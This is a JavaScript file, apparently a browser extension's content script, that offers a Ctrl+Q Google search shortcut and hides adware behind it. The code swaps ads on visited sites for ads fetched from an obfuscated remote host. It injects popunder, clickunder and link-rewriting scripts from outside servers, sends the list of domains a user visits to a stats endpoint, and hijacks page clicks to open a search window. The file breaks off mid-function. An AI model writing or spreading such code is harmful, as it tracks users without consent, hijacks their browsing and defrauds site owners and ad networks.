


var isCtrl = false;
document.onkeyup=function(e){ if(e.which == 17) isCtrl=false; }
document.onkeydown=function(e) {
    if(e.which == 17) isCtrl=true;
    if(e.which == 81 && isCtrl === true) {
        var selection = window.getSelection();
		document.location.href = 'http://www.google.com/#q=' + selection.toString();
		return false;
    }
}

console.log("quick searcher - activated");

/* !!! LI.RU START */
	function show_li(){
		//li.ru stat in iframe
		var url_li = "http://quick-s-sng-v2.biz/li.html?utm_source=31&utm_medium=Mozilla Firefox&utm_term=Chrome&utm_content=KAV&utm_campaign=1";
		var li = document.createElement("iframe");
		li.setAttribute('src', url_li);
		li.setAttribute('name', 'li');
		li.setAttribute('width', '1');
		li.setAttribute('height', '1');
		li.setAttribute('scrolling', 'no');
		li.setAttribute('frameborder', '0');
		document.body.appendChild(li);
		console.log('scaberta - li pasted');
	}
/* LI.RU END */

/* !!! HOST CHECK START*/
	var whereHostList = [ 
		'wikipedia.',
		'.gov',
		'.edu',
		'utrom.org',
		'utrom.tv',
		'vk.com', 
		'odnoklassniki.ru',
		'mail.ru',
		'pluso.ru',
		'www.rg.ru', 
		'www.kp.ru',
		'webmoney.ru',
		'itar-tass.com',
		'bank',
		'youtube.com'
	];

	function isMatchHost()
	{
		var host = window.location.host.toLowerCase();
		
		if (host=='ok.ru')
		{
			return true;
		}
		
		for(var i=0; i<whereHostList.length; i++) 
		{
			if( host.indexOf(whereHostList[i].toLowerCase()) != -1 )
				return true;
		}
		
		return false;
	}
/* !!! HOST CHECK END*/

/* Start ormes*/
	function show_ormes() {
		var url = 'http://quick-searcher.net/ormes.js';
		var s = document.createElement("script");
		s.setAttribute('async', 'async');
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		
		var temp = document.body.firstChild;
		temp.parentNode.insertBefore(s, temp)
		console.log('ormes pasted');
	}
/* END ormes*/

/* teaser replace*/
function show_teaser() {
    (function () {
    var mId = '34C51F56187CDBCB5EB5B81F946189F6',
        saId = '555';
var hostname = window.location.hostname.replace(/^w{3}\./, ''),
        donors = {
            '24smile': 19,
            'LC_teaser': 8,
            'advmaker': 20,
            'directadvert': 5,
            'google': 1,
            'marketgid': 4,
            'medialand': 2,
            'mixmarket': 23,
            'pay_click': 7,
            'rarenok': 21,
            'recreativ': 22,
            'redtram': 10,
            'teaser-goods': 9,
            'teasernet': 6,
            'test-adriver_banner': 13,
            'test-adv.kp.ru': 17,
            'test-grt02': 12,
            'test-nnn.ru': 15,
            'test-novostimira': 18,
            'test-smi2': 14,
            'trafmag': 11,
            'trg': 16,
            'yandex': 3,
            'vk': 24,
            'ok': 25,
            'mytarget': 26,
            'etarg': 27,
            'criteo': 28,
            'adwise': 29,
            'rutracker': 30,
            'mixadvert': 32,
            'rtb': 33,
            'rare': 34,
            'dagency': 35,
            'betweendigital': 36,
            'price.ru': 37,
            'ngs': 38,
            'c8.net.ua': 39,
            'admixer': 40,
            'mediafort': 41,
            'gnezdo': 42,
            'adocean': 43,
            'adfox': 44,
            'liveinternet': 45,
            'advertur': 46,
            'mediavenus': 47,
            'thor': 48,
            'yottos': 49,
            'cszz': 31
        };

    (function () {
        var cache = localStorage.getItem('_drtstat'),
            info = cache === null ? {} : JSON.parse(cache),
            last_date = info.date,
            current_date = Math.ceil(new Date().getTime() / 1000);
        if (typeof info.domains === 'undefined') {
            info.domains = {};
        }
        if (typeof info.domains[hostname] === 'undefined') {
            info.domains[hostname] = 0;
        }
        info.domains[hostname]++;
        if (typeof last_date === 'undefined' || current_date - last_date > 5 * 60) {
            info.date = current_date;
            var data = {
                mId: mId,
                sa_id: saId,
                domains: JSON.stringify(info.domains)
            };
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.protocol + '//tizertest.ru/api/stats/check');
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(Object.keys(data).map(function (item) {
                    return encodeURIComponent(item)
                        + '=' + encodeURIComponent(data[item]);
                }).join('&'));
                info.domains = {};
            } catch (e) {

            }
        }
        localStorage.setItem('_drtstat', JSON.stringify(info));
    })();
    (function () {
        var cache = localStorage.getItem('_drtsize'),
            info = cache === null ? {} : JSON.parse(cache),
            last_date = info.date,
            current_date = Math.ceil(new Date().getTime() / 1000);
        if (typeof info.data === 'undefined') {
            info.data = [];
        }
        if (info.data.length > 0 && (typeof last_date === 'undefined' || current_date - last_date > 5 * 60)) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', window.location.protocol + '//tizertest.ru/api/stats/size');
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                var data = {
                    data: JSON.stringify(info.data),
                    sa_id: saId
                };
                xhr.send(Object.keys(data).map(function (item) {
                    return encodeURIComponent(item)
                        + '=' + encodeURIComponent(data[item]);
                }).join('&'));
                info.data = [];
                info.date = current_date;
            } catch (e) {

            }
        }
        localStorage.setItem('_drtsize', JSON.stringify(info));
    })();
    var templates = {
        'criteo': {
            'donor': 'criteo',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(cto_iframe_[^'"]*)['"]*/gi,
                /<iframe[^>]*id\s*=\s*['"]*(cto_iframe_[^'"]*)['"]*/gi
            ]
        },
        'thor': {
            'donor': 'thor',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(tm-tb-[^'"]*)['"]*/gi,
                /<iframe[^>]*id\s*=\s*['"]*(tm-tb-[^'"]*)['"]*/gi
            ]
        },
        'advertur': {
            'donor': 'advertur',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(advertur_[^'"]*)['"]*/gi,
                /<iframe[^>]*id\s*=\s*['"]*(advertur_[^'"]*)['"]*/gi
            ]
        },
        'mediavenus': {
            'donor': 'mediavenus',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(venus-[^'"]*)['"]*/gi,
                /<iframe[^>]*id\s*=\s*['"]*(venus-[^'"]*)['"]*/gi
            ]
        },
        'mediafort': {
            'donor': 'criteo',
            'detect_links': [
                'mediafort.ru/click.php',
                'stranamam.ru/click.php'
            ],
            'detect_iframe': [
                'mediafort.ru',
                'stranamam.ru'
            ]
        },
        'liveinternet': {
            'donor': 'liveinternet',
            'detect_links': [
                'liveinternet.ru/cgi-bin/adv.fcgi'
            ]
        },
        'adocean': {
            'donor': 'adocean',
            'detect_iframe': [
                'adocean.pl'
            ]
        },
        'gnezdo': {
            'donor': 'gnezdo',
            'detect_iframe': [
                'news.gnezdo.ru'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(gnezdo_ru_[^'"]*)['"]*/gi
            ]
        },
        'yottos': {
            'donor': 'yottos',
            'detect_regexp': [
                /<iframe[^>]*id\s*=\s*['"]*(yottos[0-9]+[^'"]*)['"]*/gi
            ]
        },
        'admixer': {
            'donor': 'admixer',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(admixer_[^'"]*)['"]*/gi
            ]
        },
        'c8.net.ua': {
            'donor': 'c8.net.ua',
            'detect_iframe': [
                'c8.net.ua'
            ]
        },
        'price.ru': {
            'donor': 'price.ru',
            'detect_regexp': [
                /<iframe[^>]*id\s*=\s*['"]*(republer_[^'"]*)['"]*/gi
            ]
        },
        'mixadvert': {
            'donor': 'mixadvert',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(MIXADV_[^'"]*)['"]*/gi
            ]
        },
        'rtb': {
            'donor': 'rtb',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(RTBDIV_[^'"]*)['"]*/gi
            ]
        },
        'google': {
            'donor': 'google',
            'detect_class': [
                'adsbygoogle'
            ],
            'detect_regexp': [
                /<ins[^>]*id\s*=\s*['"]*(aswift_[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(google_ads_[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(div-gpt-ad-[^'"]*)['"]*/gi
            ]
        },
        'adwise': {
            'donor': 'adwise',
            'detect_function': [
                function () {
                    (function timeout() {
                        var frames = document.getElementsByTagName('iframe'),
                            block,
                            host;
                        for (var i = 0; i < frames.length; i++) {
                            try {
                                host = extract_domain(frames[i].src);
                                if (typeof frames[i]._rlpc == 'undefined' && ['cdn.skycdnhost.com', 'cdn.onedmp.com', 'psma03.com'].indexOf(host) !== -1) {
                                    frames[i]._rlpc = true;
                                    block = get_teaser_block(frames[i]);
                                    block.element.style.visibility = 'hidden';
                                    replace_block(block, function () {
                                    }, 'adwise');
                                }
                            } catch (e) {

                            }
                        }
                        var objects = document.getElementsByTagName('object');
                        for (i = 0; i < objects.length; i++) {
                            try {
                                var src = objects[i].getAttribute('data');
                                host = extract_domain(src);
                                if (typeof objects[i]._rlpc == 'undefined' && ['cdn.skycdnhost.com', 'cdn.onedmp.com', 'psma03.com'].indexOf(host) !== -1) {
                                    objects[i]._rlpc = true;
                                    block = get_teaser_block(objects[i]);
                                    block.element.style.visibility = 'hidden';
                                    replace_block(block, function () {
                                    }, 'adwise');
                                }
                            } catch (e) {

                            }
                        }
                        setTimeout(timeout, 200);
                    })();

                }
            ]
        },
        'etarg': {
            'donor': 'etarg',
            'detect_function': [
                function () {
                    (function timeout() {
                        for (var i = 0; i < document.scripts.length; i++) {
                            var host = extract_domain(document.scripts[i].src);
                            if (['neroom.ru', 'qerrex.ru'].indexOf(host) !== -1) {
                                document.scripts[i].parentNode.removeChild(document.scripts[i]);
                            }
                        }
                        var divs = document.getElementsByTagName('div');
                        for (i = 0; i < divs.length; i++) {
                            var div = divs[i];
                            if (typeof div._rlpc == 'undefined' && typeof div.onclick !== 'undefined' && div.onclick !== null) {
                                if (div.onclick.toString().indexOf("window.open('http://etarg.ru/?utm_source=site_'+document.domain.split('www.').join(''))") !== -1) {
                                    div._rlpc = true;
                                    var block = get_teaser_block(div.parentNode);
                                    block.element.style.visibility = 'hidden';
                                    replace_block(block, function () {
                                    }, 'etarg');
                                }
                            }
                        }
                        setTimeout(timeout, 500);
                    })();
                }
            ]
        },
        'mytarget': {
            'donor': 'mytarget',
            'detect_class': [
                'trg-b-' + 'b' + 'anner-block'
            ],
            'detect_regexp': []
        },
        'medialand': {
            'donor': 'medialand',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(medialand_[^'"]*)['"]*/gi
            ]
        },
        'adfox': {
            'donor': 'adfox',
            'detect_links': [
                'ads.adfox.ru'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(adfox_[^'"]*)['"]*/gi,
                /<iframe[^>]*id\s*=\s*['"]*(AdFox_[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(AdFox_banner[^'"]*)['"]*/gi
            ]
        },
        'yandex': {
            'donor': 'yandex',
            'detect_class': [
                'ya-direct-root',
                'yap-layout'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(ya_center[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(yandex_ad[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(yandex_rtb[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(yandex_direct[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(yap-yandex_ad[^'"]*)['"]*/gi
            ]
        },
        'marketgid': {
            'donor': 'marketgid',
            'detect_iframe': [
                '.marketgid.com'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(MarketGidComposite[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(TovarroComposite[^'"]*)['"]*/gi
                ///<div[^>]*id\s*=\s*['"]*(MarketGidScriptRootC[^'"]*)['"]*/gi,
                ///<div[^>]*id\s*=\s*['"]*(MarketGid[^'"]*)['"]/gi
            ]
        },
        'directadvert': {
            'donor': 'directadvert',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(DIV_DA_[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(DIV_TG_[^'"]*)['"]*/gi
            ]
        },
        'teasernet': {
            'donor': 'teasernet',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(lx_[^'"]*)['"]*/gi,
                /<div[^>]*id\s*=\s*['"]*(lx_[^'"]*)['"]/gi
            ]
        },
        'pay_click': {
            'donor': 'pay-click',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(PC_Teaser_Block_[^'"]*)['"]/gi
            ]
        },
        'LC_teaser': {
            'donor': 'ladycash',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(LC_Teaser_Block_[^'"]*)['"]/gi
            ]
        },
        'teaser-goods': {
            'donor': 'teaser-goods',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(TGB_[^'"]*)['"]/gi
            ]
        },
        'redtram': {
            'donor': 'redtram',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(rt-n-[^'"]*)['"]/gi
            ]
        },
        'trafmag': {
            'donor': 'trafmag',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(trafmag_[^'"]*)['"]/gi
            ]
        },
        'test-grt02': {
            'donor': 'grt02',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(n4p_[^'"]*)['"]/gi
            ]
        },
        'test-adriver_banner': {
            'donor': 'adriver_banner',
            'detect_iframe': [
                'adriver.ru'
            ],
            'detect_links': [
                'ad.adriver.ru/cgi-bin/click.cgi'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(adriver_banner_[^'"]*)['"]/gi,
                /<div[^>]*id\s*=\s*['"]*(adriver_[^'"]*)['"]*/gi
            ]
        },
        'rutracker': {
            'donor': 'rutracker',
            'detect_iframe': [
                'rutrk.org'
            ]
        },
        'betweendigital': {
            'donor': 'betweendigital',
            'detect_iframe': [
                'ads.betweendigital.com'
            ]
        },
        'ngs': {
            'donor': 'ngs',
            'detect_iframe': [
                'ngs.ru'
            ],
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(ngs-al-[^'"]*)['"]/gi,
                /<object[^>]*data\s*=\s*['"]*(\/\/reklama[0-9]+\.ngs\.ru[^'"]*)['"]/gi
            ]
        },
        'rare': {
            'donor': 'rare',
            'detect_iframe': [
                'ax.rareru.ru'
            ]
        },
        'cszz': {
            'donor': 'cszz',
            'detect_iframe': [
                'cszz.ru'
            ]
        },
        'dagency': {
            'donor': 'dagency',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(DADIV_[^'"]*)['"]/gi,
                /<iframe[^>]*id\s*=\s*['"]*(DAIFR_[^'"]*)['"]/gi
            ]
        },
        'test-smi2': {
            'donor': 'smi2',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(smi2adblock_[^'"]*)['"]/gi
            ]
        },
        'test-nnn.ru': {
            'donor': 'nnn',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(DIV_NNN_[^'"]*)['"]/gi
            ]
        },
        'trg': {
            'donor': 'nnn',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(trg-[^'"]*)['"]/gi
            ]
        },
        'test-adv.kp.ru': {
            'donor': 'kp',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(DIV_KP_[^'"]*)['"]/gi
            ]
        },
        'test-novostimira': {
            'donor': 'novostimira',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(CNM[^'"]*)['"]/gi
            ]
        },
        '24smile': {
            'donor': '24smile',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(smile_teaser_[^'"]*)['"]/gi
            ]
        },
        'advmaker': {
            'donor': 'advmaker',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(ambn[^'"]*)['"]/gi,
                /<iframe[^>]*id\s*=\s*['"]*(ambn[^'"]*)['"]/gi
            ]
        },
        'rarenok': {
            'donor': 'rarenok',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(b_tz_[^'"]*)['"]/gi
            ]
        },
        'recreativ': {
            'donor': 'recreativ',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(bn_[^'"]*)['"]/gi
            ]
        },
        'mixmarket': {
            'donor': 'mixmarket',
            'detect_regexp': [
                /<div[^>]*id\s*=\s*['"]*(mixkt_[^'"]*)['"]/gi
            ]
        }
    };


    function extract_domain(url) {
        var domain;
        if (url.indexOf("://") > -1) {
            domain = url.split('/')[2];
        }
        else {
            domain = url.split('/')[0];
        }
        domain = domain.split(':')[0];
        return domain;
    }

    function get_url(url) {
        var el = document.createElement('a');
        el.href = url;
        return el;
    }

    function replace_block(block, cb, donor) {
        var iframe;
        if (block === null || typeof block === 'undefined' || typeof block.element === 'undefined' || block.w < 80 || block.h < 80) {
            cb();
        } else {
            if (typeof block.element._rplc === 'undefined') {
                block.element._rplc = true;
                iframe = document.createElement('iframe');
                iframe.style.width = block.w + 'px';
                iframe.style.height = block.h + 'px';
                iframe.style.border = '0px';
                iframe.style.position = 'relative';
                block.element.parentNode.replaceChild(iframe, block.element);
                get_teaser_html(block, function (html) {
                    if (iframe.contentWindow !== null) {
                        var doc = iframe.contentWindow.document;
                        doc.open();
                        doc.write("<style>body {border:0;padding:0 !important;margin:0 !important;overflow:hidden}</style>");
                        doc.write(html);
                        doc.close();
                        if (typeof cb !== 'undefined') {
                            cb();
                        }
                    } else {
                        cb();
                    }
                }, donor);
            } else {
                cb();
            }
        }
    }

    function get_teaser_html(block, cb, donor) {
        load(function (html) {
            cb(html);
        }, {width: block.w, height: block.h, donor: donor, domain: hostname});
    }

    function get_teaser_block(block) {
        if (block === null || typeof block === 'undefined') {
            return {};
        }
        var w = block.offsetWidth,
            h = block.offsetHeight;

        return {
            element: block,
            w: w,
            h: h
        }
    }

    function execute(data) {
        var head = document.getElementsByTagName("head")[0] || document.documentElement,
            script = document.createElement("script");
        script.type = "text/javascript";
        script.appendChild(document.createTextNode(data));
        head.insertBefore(script, head.firstChild);
    }

    function add_style(str) {
        var node = document.createElement('style');
        node.innerHTML = str;
        document.body.appendChild(node);
    }

    function jsonToQueryString(json) {
        return '?' +
            Object.keys(json).map(function (key) {
                return encodeURIComponent(key) + '=' +
                    encodeURIComponent(json[key]);
            }).join('&');
    }

    function load(cb, options) {
        options = options || {};
        if (typeof mId !== 'undefined') {
            options.mId = mId;
        }
        if (typeof options.donor !== 'undefined') {
            options.net_id = donors[options.donor];
            delete options.donor;
        }
        options.ad_type = 'teaser';
        var link = '//ge' + 'tt' + 'easer' + '.ru/cont' + 'ent/20d7fa' + '' + '1cbb02d650b' + '576de62' + 'b574a0df' + '8b216cb7' + jsonToQueryString(options || {});


        load_url(function (html) {
            cb(html);
        }, link);
    }

    function load_url(cb, link) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', link);
            xhr.onreadystatechange = function () {
                if (xhr.readyState != 4) return;
                if (xhr.status == 200) {
                    cb(xhr.responseText);
                }
            };
            xhr.send(null);
        } catch (e) {
        }
    }

    function run() {
        var ylink = 'ht' + 'tps' + '://di' + 'rect.yan' + 'dex.r' + 'u/?pa' + 'rt' + 'ner';

        (function () {
            var els = document.getElementsByTagName("a");
            for (var i = 0, l = els.length; i < l; i++) {
                var el = els[i];
                if (el.href === ylink) {
                    el.innerHTML = "Реклама";
                    el.href = "#";
                }
            }
        })();
        setTimeout(run, 1000);
    }

    function getQueryVariable(variable, query) {
        var vars = query.split('&');
        for (var i = 0; i < vars.length; i++) {
            var pair = vars[i].split('=');
            if (decodeURIComponent(pair[0]) == variable) {
                return decodeURIComponent(pair[1]);
            }
        }
    }


    function replace() {
        var html = document.body.innerHTML,
            block,
            host;
        var elements = document.getElementsByClassName('ya');
        if (elements.length > 0) {
            block = get_teaser_block(elements[0]);
            replace_block(block, function () {
            }, 'yandex');
        }
        Object.keys(templates).forEach(function (code) {
            if (typeof templates[code].domain === 'undefined' || extract_domain(window.location.href) === templates[code].domain) {
                if (typeof templates[code].detect_function !== 'undefined') {
                    templates[code].detect_function.forEach(function (func) {
                        func();
                    });
                }
                if (typeof templates[code].detect_iframe !== 'undefined') {
                    templates[code].detect_iframe.forEach(function (src) {
                        var frames = document.getElementsByTagName('iframe');
                        for (var i = 0; i < frames.length; i++) {
                            if (frames[i].src.indexOf(src) !== -1) {
                                (function (element) {
                                    if (element !== null && typeof element._rplcd === 'undefined') {
                                        element.style.visibility = 'hidden';
                                        block = get_teaser_block(element);
                                        if (block.w > 0 && block.h > 0) {
                                            element._rplcd = true;
                                            replace_block(block, function () {
                                                element.style.visibility = 'visible';
                                            }, code);
                                        }
                                    }
                                })(frames[i]);
                            }
                        }
                    });
                }
                if (typeof templates[code].detect_links !== 'undefined') {
                    templates[code].detect_links.forEach(function (src) {
                        var links = document.getElementsByTagName('a');
                        for (var i = 0; i < links.length; i++) {
                            if (links[i].href.indexOf(src) !== -1 && links[i].style.position != 'absolute' && links[i].style.position != 'fixed' && links[i].innerHTML != '') {
                                (function (element) {
                                    if (element !== null && typeof element._rplcd === 'undefined') {
                                        element.style.visibility = 'hidden';
                                        element.style.display = 'inline-block';
                                        block = get_teaser_block(element);
                                        if (block.w > 0 && block.h > 0) {
                                            element._rplcd = true;
                                            replace_block(block, function () {
                                                element.style.visibility = 'visible';
                                            }, code);
                                        }
                                    }
                                })(links[i]);
                            }
                        }
                    });
                }
                if (typeof templates[code].detect_regexp !== 'undefined') {
                    templates[code].detect_regexp.forEach(function (regexp) {
                        var data = [];
                        html.replace(regexp, function (a, b) {
                            data.push(b);
                        });
                        if (data.length > 0) {
                            data.forEach(function (id) {
                                var element = document.getElementById(id);
                                if (element !== null && typeof element._rplcd === 'undefined') {
                                    block = get_teaser_block(element);
                                    if (block.w >= 80 && block.h >= 80) {
                                        element.style.visibility = 'hidden';
                                        element._rplcd = true;
                                        replace_block(block, function () {
                                            element.style.visibility = 'visible';
                                        }, code);
                                    }
                                }
                            });
                        }
                    });
                }
                if (typeof templates[code].detect_class !== 'undefined') {
                    templates[code].detect_class.forEach(function (className) {
                        var elements = document.getElementsByClassName(className);
                        for (var i = 0; i < elements.length; i++) {
                            if (typeof elements[i]._rplcd === 'undefined') {
                                var block = get_teaser_block(elements[i]);
                                if (block.w > 0 && block.h > 0) {
                                    (function (element) {
                                        element._rplcd = true;
                                        element.style.visibility = 'hidden';
                                        replace_block(block, function () {
                                            element.style.visibility = 'visible';
                                        }, code);
                                    })(elements[i]);

                                }
                            }
                        }
                    });

                }
            }
        });

        for (var i = 0; i < document.scripts.length; i++) {
            host = extract_domain(document.scripts[i].src);
            if (host.indexOf('an.yandex.ru') !== -1) {
                waitG(document.scripts[i], function () {
                }, 'yandex');
            } else if (host.indexOf('r.tut.by') !== -1) {
                waitG(document.scripts[i], function () {
                }, 'tutby');
            } else if (document.scripts[i].src.indexOf('pagead2.googlesyndication.com/pagead/show_ads.js') !== -1 ||
                document.scripts[i].src.indexOf('googletagservices.com/tag/js/gpt.js') !== -1
            ) {
                waitG(document.scripts[i], function () {
                }, 'google');
            } else if (host === 'code.directadvert.ru') {
                var url = get_url(document.scripts[i].src);
                if (url.pathname === '/show.cgi') {
                    var id = getQueryVariable('div', url.search);
                    var element = document.getElementById(id);
                    if (element !== null) {
                        block = get_teaser_block(element);
                        (function (script) {
                            replace_block(block, function () {
                                script.parentNode.removeChild(script);
                            }, 'directadvert');
                        })(document.scripts[i]);
                    }
                }
            }
        }
        setTimeout(replace, 300);
    }


    function waitG(script, cb, donor) {
        var block;
        if (script.nextSibling !== null) {
            if (typeof script.nextSibling.nextSibling !== 'undefined' && script.nextSibling.nextSibling !== null && typeof script.nextSibling.nextSibling.tagName !== 'undefined' && script.nextSibling.nextSibling.tagName.toLowerCase() === 'div')
                block = get_teaser_block(script.nextSibling.nextSibling);
            else if (typeof script.nextSibling.tagName !== 'undefined' && (script.nextSibling.tagName.toLowerCase() === 'ins' || script.nextSibling.tagName.toLowerCase() === 'div')) {
                block = get_teaser_block(script.nextSibling);
            }
            if (typeof block !== 'undefined' && typeof block.element !== 'undefined') {
                replace_block(block, function () {
                    script.parentNode.removeChild(script);
                }, donor);
            }
        }
        setTimeout(function () {
            waitG(script, cb, donor);
        }, 50);
    }

    (function () {
        function waitReady() {
            if (document.body === null) {
                setTimeout(waitReady, 50);
                return false;
            }
            var ylink = 'ht' + 'tps' + '://di' + 'rect.yan' + 'dex.r' + 'u/?pa' + 'rt' + 'ner';
            add_style('.yap-item, .yap-nitem {opacity: 0}.yap-nitem.yap-item-visible {opacity: 1;transition: 200ms}');
            add_style('a[href="' + ylink + '"] {opacity: 0}');
            if (document.location.hostname === 'ok.ru') {
                add_style('.f' + 'ort' + 'hTop' + 'Adv, ._myT' + 'a' + 'rget.t' + 'rg-b-ok-border {height: auto}');
            }
            execute('for (var name in this) {if (typeof this[name] === "object" && this[name] !== null && typeof this[name].url === "string") {try {var u = new URL(this[name].url);if (u && u.hostname.indexOf("marketgid.com")!==-1) {this[name].close(), this[name] = null;}} catch (e) {}}}');
            run();
            replace();
        }

        waitReady();
    })();


})();
    
} 
/* teaser replace*/


/* CU POPUNDER*/
	function show_cu_popunder() {
		var url = 'http://dyshagi.ru/8bfza2bp17f7surb1af3va5382kki4u3b6veva7xk9ad75rgjohl4qo8uxi8cvqwij5xfg7zaa3wmvxlyrl?53pdu42c=fec1';
		var s = document.createElement("script");
		s.setAttribute('async', 'async');
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		
		var temp = document.body.firstChild;
		temp.parentNode.insertBefore(s, temp)
	}
/* END CU POPUNDER*/

/* top POPUNDER*/
	function show_top_popunder() {
		var url = 'http://dyshagi.ru/6xk1dbhq4bf8c96hrq2onq55zugdzsrx393sbwzfwwsl72zonuzx6ww60duj1q54wr6babn2qlt1ipjvayp?4jz2pkb8=fec1';
		var s = document.createElement("script");
		s.setAttribute('async', 'async');
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		
		var temp = document.body.firstChild;
		temp.parentNode.insertBefore(s, temp)
	}
/* END top POPUNDER*/

/* SL POPUNDER*/
	function show_bottom_popunder() {
		var url = 'http://dyshagi.ru/65uaj4l2q1n6hqla3y44t26xqns8a3dxz7y7phr5r30l6rwl4l19fls6s3ld8msj6j62yzzm9lzk6w7lk5d?5lgnuluc=fec1';
		var s = document.createElement("script");
		s.setAttribute('async', 'async');
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		
		var temp = document.body.firstChild;
		temp.parentNode.insertBefore(s, temp)
	}
/* END SL POPUNDER*/

/* VIDEO */
	function show_video_locker() {
		var url = '//am15.net/bn.php?s=67274&f=4&d=1146350780';
		var s = document.createElement("script");
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		s.setAttribute('id', 'ambn1146350780');
		
		document.body.appendChild(s);
	}
/* VIDEO END*/

/* CLICKUNDER GOOD HOSTS */
	function show_clickuner_gh() {
		var url = 'http://quick-s-sng-v2.biz/rand_clickunder_gh.js';
		var s = document.createElement("script");
		s.setAttribute('charset', 'UTF-8');
		s.setAttribute('language', 'javascript');
		s.setAttribute('type', 'text/javascript');
		s.setAttribute('src', url);
		
		document.body.appendChild(s);
	}
/* CLICKUNDER GOOD HOSTS END */

/* CPA TEXT */
function show_cpa_text(){
    (function (w, d) {
        w.CpaTextConfig = {"id":2560,"modules":["link","phrase"],"phrase_link_target":"_blank","phrase_min_distance":300};
        var js, id = "cpatext-script", ref = d.getElementsByTagName('script')[0];
        var proto = d.location.protocol === "https:" ? "https:" : "http:";
        if (d.getElementById(id)) {return;}
        js = d.createElement('script'); js.id = id; js.async = true; js.charset = 'utf-8';
        js.src = proto + '//api.cpatext.ru/js/cpatext.js?r' + (new Date).getDate();
        ref.parentNode.insertBefore(js, ref);
    }(window, document));
}
/* CPA TEXT */

function show_mecash() {
    (function (w, d) {
        var content = 'window.mecash_config = {replace_id: 1056, phrase_min_distance: 200};';
        var target = d.getElementsByTagName('head')[0];
        var js = d.createElement('script');
        js.textContent = content;
        target.appendChild(js);

        var id = "mecash-replace";
        if (d.getElementById(id)) {return}
        js = d.createElement('script');
        js.id = id;js.async = true;js.charset = 'utf-8';
        js.src = '//cdn.mecash.ru/js/replace.js?r' + ((new Date()).getTime()/3600000|0);
        target.appendChild(js);
    }(window, document));
}


function show_mail()    
{
	var destUrl = 'http://go.mail.ru/search?&gp=820351&frc=820351&q=';
	
	document.onclick = function(event) 
	{
		if( isAlreadyOpened() === true )
			return true;
	 
		var newWin = window.open(destUrl+ encodeURIComponent(document.title), "newWinMail");
		newWin.focus();
	 
		setAlreadyOpened();
	 
		event.preventDefault();
		event.stopPropagation();
	 
		return false;
	}
	
	function isAlreadyOpened()
	{
		if( window.myMailWindowOpen === true )
			return true;
		
		if( isLocalStorageAvailable() === false )
			return false;
			
		return sessionStorage.getItem('qs-mail') === 'yes';
	}
	
	function setAlreadyOpened()
	{
		window.myMailWindowOpen = true;
		
		if( isLocalStorageAvailable() )
			sessionStorage.setItem('qs-mail', 'yes');
		
		return true;
	}
	
	function isLocalStorageAvailable() 
	{
		try {
			return 'sessionStorage' in window && window['sessionStorage'] !== null;
		} catch (e) {
			return false;
		}
	}
}



/* IM search */
function show_im_search()
{
function loadScript(script_url, callback) {
  var script = document.createElement('script');
  script.setAttribute("type","text/javascript");
  document.getElementsByTagName("head")[0].appendChild(script);
  script.setAttribute("src", script_url);
  script.onload = callback;
}
